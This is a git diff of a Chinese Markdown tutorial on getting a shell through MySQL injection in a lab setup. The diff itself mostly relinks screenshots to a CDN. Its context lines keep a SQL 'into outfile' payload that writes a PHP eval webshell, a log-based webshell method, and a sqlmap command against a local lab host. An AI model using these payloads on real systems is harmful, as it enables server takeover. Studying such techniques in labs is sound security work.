@@ -17,13 +17,13 @@ MYSQL注入 GETSHELL
 
 5.7.26为null，5.5.29为空
 
-![image-20240410161844061](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410161844061.png)
+![image-20240410161844061](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946877.png)
 
 这里用的是5.5.29版本默认为空，可以写入任何地方，当然目录需要有写的权限
 
  
 
-![image-20240410161859475](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410161859475.png)
+![image-20240410161859475](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946878.png)
 
  
 
@@ -40,7 +40,7 @@ MYSQL注入 GETSHELL
 
  
 
-![image-20240410161911064](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410161911064.png)
+![image-20240410161911064](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946879.png)
 
 写入的文件是这样的
 
@@ -51,7 +51,7 @@ MYSQL注入 GETSHELL
 
 注意这里一定要用一个可以查询到的值，不然写文件会为空
 
-![image-20240410162105241](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162105241.png)
+![image-20240410162105241](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946880.png)
 
 **lines starting by**
 
@@ -60,7 +60,7 @@ MYSQL注入 GETSHELL
 | 1   | select \* from users where id=1 into outfile 'D:\\phpstudy_pro\\WWW\\shell.php' lines starting by '\<?php eval(\$\_POST\[\\pass\\\]); ?\>'; |
 |-----|---------------------------------------------------------------------------------------------------------------------------------------------|
 
- ![image-20240410162117508](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162117508.png)
+ ![image-20240410162117508](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946881.png)
 
 
 
@@ -73,7 +73,7 @@ MYSQL注入 GETSHELL
 
  
 
-![image-20240410162128321](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162128321.png)
+![image-20240410162128321](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946882.png)
 
 **COLUMNS terminated by**
 
@@ -84,7 +84,7 @@ MYSQL注入 GETSHELL
 
  
 
-![image-20240410162140176](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162140176.png)
+![image-20240410162140176](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946883.png)
 
 写入文件结果和上面的方法一样
 
@@ -99,7 +99,7 @@ MYSQL注入 GETSHELL
 
  
 
-![image-20240410162204353](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162204353.png)
+![image-20240410162204353](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946884.png)
 
  
 
@@ -108,27 +108,27 @@ MYSQL注入 GETSHELL
 
  
 
-![image-20240410162233308](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162233308.png)
+![image-20240410162233308](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946885.png)
 
 可以看到这个是带着数据的，里面有查询出来的数据和自己写的12，所以只要让查询为空，然后union select后面接着的数据为空就可以达到干净的文件的效果
 
 **0x04 日志getshell**
 
-![image-20240410162324527](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162324527.png) 
+![image-20240410162324527](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946886.png) 
 
-![image-20240410162251997](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162251997.png)
+![image-20240410162251997](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946887.png)
 
 修改好之后是这样的
 
-![image-20240410162336044](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162336044.png)
+![image-20240410162336044](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946888.png)
 
 然后执行语句
 
-![image-20240410162346222](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162346222.png)
+![image-20240410162346222](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946889.png)
 
 查看日志文件
 
-![image-20240410162404205](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162404205.png)
+![image-20240410162404205](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946890.png)
 
 已经将webshell写入网站根目录了
 
@@ -176,7 +176,7 @@ sqlmap -u [*http://192.168.43.145/2_Shotting_Range/sql/Less-1/?id=1*](http://192
 
  
 
-![image-20240410162418399](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162418399.png)
+![image-20240410162418399](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946891.png)
 
  
 
@@ -188,7 +188,7 @@ tmpbeewq.php 用来执行系统命令
 
 tmpuqvgw.php 用来上传文件
 
-![image-20240410162429046](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162429046.png)
+![image-20240410162429046](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946892.png)
 
  
 
@@ -204,7 +204,7 @@ tmpuqvgw.php 用来上传文件
 
  
 
-![image-20240410162444539](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162444539.png)
+![image-20240410162444539](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946893.png)
 
  
 
@@ -214,7 +214,7 @@ tmpuqvgw.php 用来上传文件
 
 我们上传一个php的一句话后门
 
-![image-20240410162452197](C:/Users/Lynn/AppData/Roaming/Typora/typora-user-images/image-20240410162452197.png)
+![image-20240410162452197](http://cdn.jsdelivr.net/gh/LynnJY/NoteDemo/20250319153946894.png)
 
  
 
